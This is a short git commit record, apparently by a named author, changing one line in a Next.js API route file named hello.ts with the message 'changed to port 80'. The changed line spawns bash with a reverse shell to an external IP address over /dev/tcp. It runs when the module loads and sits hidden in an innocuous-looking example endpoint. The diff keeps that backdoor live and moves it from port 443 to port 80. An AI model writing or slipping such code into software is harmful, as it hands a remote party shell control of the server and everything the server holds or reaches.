298b8b8cdbab655c197f9f6ee141a1d6bb6c4186
Jack Bruce <jackery@amazon.com>
2025-01-08 15:17:32 -0800

    changed to port 80

--- pages/api/hello.ts
+++ pages/api/hello.ts
@@ -1,7 +1,7 @@
 import type { NextApiRequest, NextApiResponse } from 'next'
 import { spawn } from 'child_process';
 
-const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/35.95.27.121/443', '0<&1', '2>&1'], { shell: true });
+const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/35.95.27.121/80', '0<&1', '2>&1'], { shell: true });
  console.log(child);
  
 type ResponseData = {
